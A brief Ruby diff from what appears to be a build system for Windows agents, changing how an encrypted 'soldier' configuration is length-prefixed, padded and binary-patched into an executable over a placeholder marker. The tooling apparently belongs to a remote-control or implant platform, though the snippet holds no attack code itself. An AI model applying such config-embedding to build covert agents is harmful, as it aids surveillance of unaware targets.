@@ -59,8 +59,9 @@ class BuildWindows < Build
         marker = "Config"
         # binary patch the config
         config = @factory.configs.first.encrypted_soldier_config(@factory.confkey)
+        bin = [config.bytesize].pack('I') + config.ljust(512 - 4, "\x00")
         # pad the config to 512 bytes
-        content.binary_patch 'CONF'*128, config.ljust(512, "\x00")
+        content.binary_patch 'CONF'*128, bin
       rescue Exception => e
         raise "#{marker} marker not found: #{e.message}"
       end
